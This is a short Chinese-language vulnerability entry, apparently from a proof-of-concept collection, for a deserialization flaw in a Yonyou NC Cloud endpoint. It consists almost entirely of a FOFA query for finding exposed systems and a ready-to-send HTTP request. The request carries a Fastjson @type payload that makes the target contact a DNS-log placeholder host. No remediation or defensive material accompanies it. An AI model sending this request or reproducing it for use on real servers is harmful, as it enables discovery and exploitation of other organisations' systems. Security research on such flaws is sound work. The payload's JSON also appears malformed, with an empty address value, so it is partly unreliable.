## 用友NC-Cloud接口blobRefClassSea存在反序列化漏洞

用友NC Cloud接口 /ncchr/pm/ref/indiIssued/blobRefClassSearch 存在反序列漏洞。

## fofa

```yaml
app="用友-NC-Cloud"
```

## poc

```yaml
POST /ncchr/pm/ref/indiIssued/blobRefClassSearch HTTP/1.1
Content-Type: application/json
Host: 
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.4103.116 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

{"clientParam":"{\"x\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"DNSLOG.COM\"}}}"}
```

